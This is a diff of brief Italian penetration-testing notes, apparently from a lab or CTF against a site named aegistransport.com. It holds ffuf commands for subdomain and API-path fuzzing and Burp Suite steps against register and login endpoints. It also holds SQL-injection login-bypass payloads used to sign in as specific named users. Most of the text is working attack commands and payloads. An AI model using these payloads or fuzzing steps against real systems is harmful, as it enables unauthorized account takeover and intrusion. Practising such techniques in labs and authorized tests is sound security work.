@@ -1,5 +1,19 @@
 prova injection su login, mappa etc.
 
+PER API V1
+Burpsuite:
+creazione utente da sito -> /api/v1/auth/register
+login -> /api/v1/auth/login
+
+notes.txt -> passare tutte le v0 a v1
+
+```
+	ffuf -w /usr/share/wordlists/sec -u http://website.com/api/v1/FUZZ 1. -mc 200-299,301,302,307,401,403,405,422,500
+```
+
+/usr/share/seclists/Discovery/Web-Content/api/
+
+
 ffuf:
 ```
 	ffuf -w ./wordlist.txt -u https://FUZZ.aegistransport.com
@@ -41,7 +55,8 @@ fai login da admin con:
 - ') OR '1'='1' AND username='g.ricci'; --
 
 su burpsuite:
-"username":"g.ricci","password":"') OR '1'='1' AND username='m.ferretti'; -- "
+"username":"g.ricci",
+"password":"') OR '1'='1' AND username='m.ferretti'; -- "
 
 POSTMAN
 POST https://dev.aegistransport.com/api/v1/vip/search/run
